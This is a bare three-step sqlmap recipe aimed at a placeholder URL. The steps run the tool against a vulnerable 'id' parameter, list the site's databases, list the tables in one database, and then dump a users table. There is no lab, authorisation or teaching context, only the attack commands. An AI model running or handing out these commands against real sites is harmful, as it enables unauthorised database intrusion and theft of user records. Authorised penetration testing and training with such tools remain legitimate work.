1. initial scan:
```
sqlmap -u "http://target.com/page.php?id=1" --dbs
```
2. database enumeration:
```
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```
3. detailed extraction:
```
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users_table --dump
```

